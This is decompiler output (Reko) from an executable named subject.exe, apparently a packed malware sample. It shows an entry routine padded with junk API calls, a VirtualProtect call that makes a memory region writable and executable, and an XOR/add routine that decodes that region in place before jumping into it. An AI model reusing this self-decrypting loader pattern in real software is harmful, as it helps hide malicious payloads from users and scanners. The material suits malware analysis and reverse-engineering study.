// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 004244C2: Register Eq_2 Win32CrtStartup()
Eq_2 Win32CrtStartup()
{
	GetCurrentThreadId();
	GetCommandLineW();
	GetOEMCP();
	GetCommandLineA();
	Eq_2 eax_30 = GetModuleHandleA(&globals->t431076);
	Eq_2 eax_50 = CreateFileA(&globals->t431080, 0x00, 0x01, 0x00, 0x03, 0x0101, 0x00);
	Eq_39 eax_53 = GetProcAddress(eax_30, &globals->t43102C);
	do
	{
		eax_53();
		CreateFileA(&globals->t431000, 0xC0000000, 0x04, 0x00, 0x03, 0x0107, 0x00);
		fn0042474E(dwArg00, dwArg04, dwArg08);
		LoadResource(0x00, eax_50);
		GetCommandLineW();
		real64 rArg0_77 = <invalid>;
		ptr32 esp_111 = fp - 0x4C;
		do
		{
			struct Eq_46 * esp_116 = esp_111 - 0x04;
			esp_116->t0000 = fp - 0x1C;
			*(esp_116 - 0x04) = 0x40;
			*(esp_116 - 0x08) = 29499;
			GetOEMCP();
			*(esp_116 - 0x0C) = 0x00429000;
			GetCommandLineA();
			VirtualProtect(*(esp_116 - 0x0C), *(esp_116 - 0x08), *(esp_116 - 0x04), esp_116->t0000);
			esp_116->t0000.u0 = 0x00;
			*(esp_116 - 0x04) = 0x26;
			*(esp_116 - 0x08) = 0x03;
			*(esp_116 - 0x0C) = 0x00;
			*(esp_116 - 0x10) = 0x06;
			*(esp_116 - 0x14) = 0x00;
			*(esp_116 - 0x18) = 0x00431045;
			CreateFileA(*(esp_116 - 0x18), *(esp_116 - 0x14), *(esp_116 - 0x10), *(esp_116 - 0x0C), *(esp_116 - 0x08), *(esp_116 - 0x04), esp_116->t0000);
			esp_116->t0004.u0 = 0x00;
			esp_116->t0000.u0 = 0xA4;
			*(esp_116 - 0x04) = 0x03;
			*(esp_116 - 0x08) = 0x00;
			*(esp_116 - 0x0C) = 0x00;
			*(esp_116 - 0x10) = 0xE0000000;
			*(esp_116 - 0x14) = 4395045;
			CreateFileA(*(esp_116 - 0x14), *(esp_116 - 0x10), *(esp_116 - 0x0C), *(esp_116 - 0x08), *(esp_116 - 0x04), esp_116->t0000, esp_116->t0004);
			GetCommandLineA();
			esp_116->t0008 = eax_50;
			esp_116->t0004.u0 = 0x00;
			SizeofResource(esp_116->t0004, esp_116->t0008);
			esp_116->t000C.u0 = 0x00;
			esp_116->t0008.u0 = 0x26;
			esp_116->t0004.u0 = 0x03;
			esp_116->t0000.u0 = 0x00;
			*(esp_116 - 0x04) = 0x02;
			*(esp_116 - 0x08) = 0x60000000;
			*(esp_116 - 0x0C) = 0x00431060;
			esp_111 = (char *) &esp_116->t000C + 0x04;
		} while (CreateFileA(*(esp_116 - 0x0C), *(esp_116 - 0x08), *(esp_116 - 0x04), esp_116->t0000, esp_116->t0004, esp_116->t0008, esp_116->t000C) != ~0x00);
		esp_116->t000C.u0 = 0x00;
		esp_116->t0008.u0 = 0x87;
		esp_116->t0004.u0 = 0x03;
		esp_116->t0000.u0 = 0x00;
		*(esp_116 - 0x04) = 0x07;
		*(esp_116 - 0x08) = 0xA0000000;
		*(esp_116 - 0x0C) = 0x0043103D;
	} while (CreateFileA(*(esp_116 - 0x0C), *(esp_116 - 0x08), *(esp_116 - 0x04), esp_116->t0000, esp_116->t0004, esp_116->t0008, esp_116->t000C) != ~0x00);
	Eq_101 eax_222 = CloseHandle(*(ebp - 0x04));
	ebp->r41C5A1EB = rArg0_77;
	word32 esp_227;
	word32 ebp_228;
	byte SCZO_229;
	word32 ebx_230;
	word32 edi_231;
	word32 esi_232;
	Eq_2 eax_233;
	bool Z_234;
	word32 ecx_235;
	byte SZO_236;
	real64 rArg0_237;
	fnEBE06D54();
	return eax_233;
}

// 0042474E: void fn0042474E(Stack (ptr32 word32) dwArg04, Stack uint32 dwArg08, Stack word32 dwArg0C)
void fn0042474E(word32 * dwArg04, uint32 dwArg08, word32 dwArg0C)
{
	word32 * edi_16 = dwArg04;
	uint32 edx_19 = dwArg08 >> 0x02;
	do
	{
		*edi_16 = *edi_16 - dwArg0C;
		*edi_16 = *edi_16 + dwArg0C;
		*edi_16 = *edi_16 - dwArg0C;
		*edi_16 = *edi_16 ^ 3070175363;
		*edi_16 = *edi_16 + 3161557686;
		*edi_16 = *edi_16 + 0xF02C43D1;
		*edi_16 = *edi_16 + 4232936312;
		*edi_16 = *edi_16 ^ dwArg0C;
		*edi_16 = *edi_16 + dwArg0C;
		edi_16 = edi_16 + 0x01;
		edx_19 = edx_19 - 0x01;
	} while (edx_19 != 0x00);
}

